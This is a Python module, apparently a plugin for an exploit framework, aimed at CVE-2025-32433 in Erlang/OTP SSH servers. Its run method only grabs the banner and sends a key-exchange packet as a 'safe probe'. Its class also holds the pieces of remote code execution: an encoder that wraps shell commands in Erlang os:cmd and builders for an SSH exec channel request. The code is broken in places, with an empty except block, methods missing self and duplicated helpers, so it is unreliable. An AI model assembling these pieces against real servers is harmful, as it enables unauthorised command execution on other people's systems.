from Metode import *
from utils import Logger
import socket
import struct
import time
import argparse
import base64

log = Logger()

class CExploit(Exploit):
    """
    CVE-2025-32433 Exploit
    """

    def __init__(self):
        super().__init__()
        self._ipAddr = ""
        #self._port = 2222
        self._timeout = 5
        self._sleep = 0.3

    def string_payload(s):
    	s_bytes = s.encode("utf-8")
    	return struct.pack(">I", len(s_bytes)) + s_bytes

    def pad_packet(payload, block_size=8):
    	min_padding = 4
    	padding_len = block_size - ((len(payload) + 5) % block_size)
    	if padding_len < min_padding:
            padding_len += block_size
    	return (
            struct.pack(">I", len(payload) + 1 + padding_len)
            + bytes([padding_len])
            + payload
            + bytes([0] * padding_len)
    	)

    def format_erlang_command(cmd):
    	encoded_cmd = base64.b64encode(cmd.encode()).decode()
    	return f'os:cmd(binary_to_list(base64:decode("{encoded_cmd}"))).'

    def build_kexinit():
    	cookie = b"\x00" * 16

    	def name_list(l):
    	    return string_payload(",".join(l))

    	# Match server-supported algorithms from the log
    	return (
    	    b"\x14"
    	    + cookie
    	    + name_list(
    	    	[
                    "curve25519-sha256",
                    "ecdh-sha2-nistp256",
                    "diffie-hellman-group-exchange-sha256",
                    "diffie-hellman-group14-sha256",
            	]
    	    )  # kex algorithms
    	    + name_list(["rsa-sha2-256", "rsa-sha2-512"])  # host key algorithms
    	    + name_list(["aes128-ctr"]) * 2  # encryption client->server, server->client
    	    + name_list(["hmac-sha1"]) * 2  # MAC algorithms
    	    + name_list(["none"]) * 2  # compression
    	    + name_list([]) * 2  # languages
    	    + b"\x00"
    	    + struct.pack(">I", 0)  # first_kex_packet_follows, reserved
    	)

    def build_channel_open(channel_id=0):
    	return (
	    b"\x5a"  # SSH_MSG_CHANNEL_OPEN
	    + string_payload("session")
	    + struct.pack(">I", channel_id)  # sender channel ID
	    + struct.pack(">I", 0x68000)  # initial window size
	    + struct.pack(">I", 0x10000)  # max packet size
    	)

    def build_channel_request(channel_id=0, command=None):
    	return (
	    b"\x62"  # SSH_MSG_CHANNEL_REQUEST
	    + struct.pack(">I", channel_id)
	    + string_payload("exec")
	    + b"\x01"  # want_reply = true
	    + string_payload(command)
    	)

    def makePayload(self, params=list):
        log.debugger(params)
        self._ipAddr = params[0][0]
        self._port = 2222
        try:
            self._port = int(params[0][1]) if len(params[0]) > 1 else 2222
        except Exception:
            

    def startExploit(self):
        result = {
            "target": "",
            "banner": "",
            "kex_response_len": 0,
            "status": "UNKNOWN",
            "notes": "",
        }

        result["target"] = f"{self._ipAddr}:{self._port}"

        try:
            with socket.create_connection((self._ipAddr, self._port), timeout=self._timeout) as s:
                s.settimeout(self._timeout)

                s.sendall(b"SSH-2.0-OpenSSH_8.9\r\n")
                banner = s.recv(1024)
                result["banner"] = banner.strip().decode(errors="ignore")
                time.sleep(self._sleep)

                s.sendall(_pad_packet(_build_kexinit()))
                time.sleep(self._sleep)

                try:
                    resp = s.recv(4096)
                    result["kex_response_len"] = len(resp)
                except socket.timeout:
                    result["notes"] = "No response after KEXINIT"

                if "Erlang" in result["banner"] or "OTP" in result["banner"]:
                    result["status"] = "POTENTIAL"
                    result["notes"] = "Erlang/OTP SSH indicated by banner"
                else:
                    result["status"] = "UNKNOWN"
                    if not result["notes"]:
                        result["notes"] = "No Erlang/OTP fingerprint from banner"

        except Exception as e:
            result["status"] = "ERROR"
            result["notes"] = str(e)

        out_path = f"{self.outExpFile}{self._ipAddr}_cve2025_32433_probe.txt"
        try:
            with open(out_path, "w") as f:
                f.write("CVE-2025-32433 SAFE PROBE RESULT\n")
                f.write(f"Target      : {result['target']}\n")
                f.write(f"Banner      : {result['banner']}\n")
                f.write(f"KEX Resp Len: {result['kex_response_len']}\n")
                f.write(f"Status      : {result['status']}\n")
                f.write(f"Notes       : {result['notes']}\n")
            print(f"\n[+] Report written: {out_path}")
        except Exception as e:
            print(f"[!] Failed writing report: {e}")

        print(f"[+] Target : {result['target']}")
        print(f"[+] Status : {result['status']}")
        print(f"[+] Notes  : {result['notes']}")

def _string_payload(s: str) -> bytes:
    b = s.encode("utf-8")
    return struct.pack(">I", len(b)) + b

def _build_kexinit() -> bytes:
    cookie = b"\x00" * 16

    def name_list(items):
        return _string_payload(",".join(items))

    payload = (
        b"\x14"
        + cookie
        + name_list([
            "curve25519-sha256",
            "ecdh-sha2-nistp256",
            "diffie-hellman-group14-sha256",
        ])
        + name_list(["rsa-sha2-256", "rsa-sha2-512"])
        + name_list(["aes128-ctr"]) * 2
        + name_list(["hmac-sha1"]) * 2
        + name_list(["none"]) * 2
        + name_list([]) * 2
        + b"\x00"
        + struct.pack(">I", 0)
    )
    return payload

def _pad_packet(payload: bytes, block_size: int = 8) -> bytes:
    min_padding = 4
    padding_len = block_size - ((len(payload) + 5) % block_size)
    if padding_len < min_padding:
        padding_len += block_size
    return (
        struct.pack(">I", len(payload) + 1 + padding_len)
        + bytes([padding_len])
        + payload
        + bytes([0] * padding_len)
    )


